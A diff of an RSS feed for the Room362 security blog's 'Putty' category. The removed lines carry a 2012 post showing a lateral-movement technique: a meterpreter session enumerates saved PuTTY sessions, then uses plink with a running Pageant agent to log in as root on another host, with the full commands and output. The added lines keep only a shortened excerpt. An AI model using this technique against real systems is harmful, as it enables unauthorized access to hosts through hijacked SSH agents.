@@ -1,13 +1,16 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Room362</title>
-    <link>https://room362.com/categories/putty/index.xml</link>
-    <description>Recent content on Room362</description>
+    <title>Putty on Room362</title>
+    <link>https://room362.com/categories/putty/</link>
+    <description>Recent content in Putty on Room362</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; 2016. All rights reserved.</copyright>
-    <atom:link href="https://room362.com/categories/putty/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 28 Aug 2012 15:42:03 +0000</lastBuildDate>
+    
+	<atom:link href="https://room362.com/categories/putty/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>Free Shells with Plink and Pageant</title>
@@ -15,41 +18,8 @@
       <pubDate>Tue, 28 Aug 2012 15:42:03 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-08-28-free-shells-with-plink-and-pageant/</guid>
-      <description>&lt;p&gt;Watching &lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;Egypt&lt;/a&gt;’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; run enum_putty
-[*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]]
-[*] Saved SSH Server Public Keys:
-[*]     rsa2@22:172.16.10.150
-[*] Session corp_webserver:
-[*]     Protocol: SSH
-[*]     Hostname: 172.16.10.150
-[*]     Username: root
-[*]     Public Key:
-meterpreter &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; shell
-Process 3364 created.
-Channel 1 created.
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
-
-C:\Program Files\PuTTY&amp;gt;plink -agent root@172.16.10.150
-plink -agent root@172.16.10.150
-Welcome to Ubuntu 12.04 LTS (GNU/Linux 2.6.39.1-34 i686)
-No mail.
-Last login: Tue Aug 28 14:15:18 2012 from 172.16.10.100
-root@172.16.10.150:~]$ id
-uid=0(root) gid=0(root) groups=0(root)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;w00t! An extra shell for free!!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://room362.com/images/postimages/201208_freeshells_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-</description>
+      <description>Watching Egypt’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:
+meterpreter &amp;gt; run enum_putty [*] Putty Installed for [[&amp;quot;Administrator&amp;quot;]] [*] Saved SSH Server Public Keys: [*] rsa2@22:172.16.10.150 [*] Session corp_webserver: [*] Protocol: SSH [*] Hostname: 172.16.10.150 [*] Username: root [*] Public Key: meterpreter &amp;gt;  Awesome, this guy runs as root and we have the IP address.</description>
     </item>
     
   </channel>
